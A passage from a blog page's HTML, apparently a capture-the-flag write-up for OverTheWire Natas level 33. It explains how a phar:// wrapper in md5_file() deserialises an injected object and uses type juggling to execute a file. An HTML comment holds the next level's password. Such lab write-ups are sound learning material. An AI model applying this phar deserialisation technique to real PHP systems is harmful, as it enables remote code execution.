+<p>To understand why the request triggers deserialisation of the <code>Executor</code> object in <code>payload.phar</code>, we have to pay attention to the <code>__destruct()</code> magic method of <code>Executor</code> objects which will automatically be called at the end of the main PHP script.</p>
+<p>When the final request is made, &lsquo;phar://payload.phar&rsquo; is stored in the <code>$filename</code> property of the corresponding <code>Executor</code> object which is created. When <code>__destruct()</code> runs, it tries to check the md5 hash of the file which had just been uplaoded, and it does so by calling the <code>md5_file()</code> function on the <code>$filename</code> of the <code>Executor</code> object. However, because of the stream wrapper &lsquo;phar://&rsquo;, <code>md5_file(phar://payload.phar)</code> doesn&rsquo;t (only) calculate the hash of the file which had just been uploaded, it actually pulls data from the metadata section of <code>payload.phar</code> and deserialises it (<a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization">source</a>).</p>
+<p>This deserialisation injects our modified <code>Executor</code> object, and the <code>__destruct()</code> method for this object will automatically be called as well. Since its <code>$signature</code> is the boolean value <code>True</code>, the md5 check using loose comparison is automatically passed due to type juggling. Finally, since the filename of this injected object is <code>getpassword.php</code>, <code>getpassword.php</code> ultimately ends up being executed and prints the password for natas34:</p>
+<p><a href="/images/otw_natas/natas33-2_solved.png"><img src="/images/otw_natas/natas33-2_solved.png" alt="natas34 password printed"></a></p>
+<!-- F6Fcmavn8FgZgrAPOvoLudNr1GwQTaNG -->
+</article>
+
+
+    </div>
+
+    
+    <div>
+        <button id="to-top-button" onclick="goToTop()" title="Go To Top"
+        class="hidden fixed z-90 bottom-7 right-7 btn btn-ghost btn-circle"><i class="fa-solid fa-caret-up fa-2xl" style="color: #d4d4d4;"></i>
+        </button>
+    </div>
+    
+
+    
+    <script>
+        var toTopButton = document.getElementById("to-top-button");
+
+        
+        window.onscroll = function () {
+            if (document.body.scrollTop > 200 || document.documentElement.scrollTop > 200) {
+                toTopButton.classList.remove("hidden");
+            } else {
+                toTopButton.classList.add("hidden");
+            }
+        }
+
+        
+        function goToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+    </script>
+
+
+<footer class="mt-20 p-2 bg-base-200 text-base-content">
+     <div class="max-w-2xl justify-between m-auto flex text-xs space-y-1">
+        
+          <div class="flex-1 my-auto">
+            <p class="block my-2">
+               
+               
+               
+               
+                  
+               &copy; 2024 - Justin Ngo. <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="link">Some rights reserved.</a>   
+           </p>
+           
+           <p class="block mb-2">
+                 
+                Made with <svg class="icon w-4 h-4" xmlns="http://www.w3.org/2000/svg" height="48" viewBox="0 -960 960 960" width="48"><path d="M645.889-470q-6.689 0-12.9-2T622-479q-87-78-148.5-148.757T412-760q0-51.758 35.22-86.879Q482.439-882 534.341-882 564-882 593.5-865.5T646-821q23-28 52.5-44.5t59.159-16.5q51.902 0 87.122 35.121Q880-811.758 880-760q0 61.486-61.5 132.243T670.055-479q-5.055 5-11.266 7t-12.9 2Zm.111-71q66-60 120-119t54-100q0-27.423-17.356-44.712Q785.288-822 757.758-822 741-822 724.5-814q-16.5 8-33.5 30l-45 55-45-55q-17-22-33.5-30t-33.258-8q-27.53 0-44.886 17.288Q472-787.423 472-760q0 41 54 100t120 119Zm-84 417 248-78q-6-8-15.194-20.5Q785.613-235 774-235H536q-2 0-18-1.5t-31-8.5l-66-20q-12-4-18-16t-2-24q4-12 15.278-18T440-324l93 31q-2 0 14.5-1t47.333-1H604q0-12.419-4.5-23.71Q595-330 584-335l-245-93h-84v214l307 90Zm-13 57-294-84q-2 27-22.5 42T195-94h-95q-24.75 0-42.375-17.625T40-154v-274q0-24.75 17.625-42.375T100-488h238q5.333 0 10.667 1Q354-486 359-484l245 92q27 10 45.5 32.5T668-295h114q42 0 70 30t28 81q0 11-5 19.5T859-152L583-67q-8.171 2-17.086 2Q557-65 549-67Zm97-615ZM100-154h94v-274h-94v274Z"/></svg> and <a class="link" href="https://github.com/jacksalici/salinger-theme">Salinger Theme</a>.
+                
+           </p>
+
+          </div>
+
+          
+
+
+           
+           
+     </div>
+ 
+   
+  </footer>
+
+
+
+
+
+
+</body>
+
+    <script>
+
+      
+
+      try {
+          twemoji.parse(document.body, {
+            folder: "svg",
+            ext: ".svg",
+          });
+      } catch(e) {
+        if (e instanceof ReferenceError) {
+            console.log("Tweemoji not initialized")
+            console.log(e)
+        }
+      }
+    </script>
+</html>
